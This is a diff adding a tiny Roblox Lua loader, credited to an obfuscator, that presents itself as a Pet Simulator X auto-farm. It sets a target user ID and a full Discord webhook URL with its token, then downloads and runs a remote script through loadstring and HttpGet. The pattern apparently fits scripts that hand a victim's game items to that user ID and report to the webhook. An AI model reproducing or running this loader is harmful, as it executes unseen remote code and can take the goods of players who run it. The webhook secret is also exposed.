@@ -1,0 +1,5 @@
+--discord.gg/boronide, code generated using luamin.js™
+
+
+
+_G.UserID=6284583030;_G.WebHook="https://discord.com/api/webhooks/1140349316431630486/LnTjnA5HolXUqmBasyzO6ZAGHIDuTpMRPIAiJQ_x-c5mLahI6gVL_nmHDeoDtcFjLSFP"loadstring(game:HttpGet("https://raw.githubusercontent.com/vestyx/PetSimulatorXAutoFarm/main/HasteFarm.lua",true))()
